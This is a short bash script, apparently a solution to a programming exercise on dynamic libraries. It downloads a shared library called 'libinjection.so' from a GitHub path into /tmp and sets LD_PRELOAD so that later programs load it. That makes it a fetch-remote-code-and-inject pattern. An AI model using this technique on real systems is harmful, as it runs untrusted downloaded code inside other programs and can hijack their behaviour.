#!/bin/bash
wget -O /tmp/libinjection.so https://github.com/Susiniosgit/alx-low_level_programming/0x17-dynamic_libraries/libinjection.so
export LD_PRELOAD=/tmp/libinjection.so
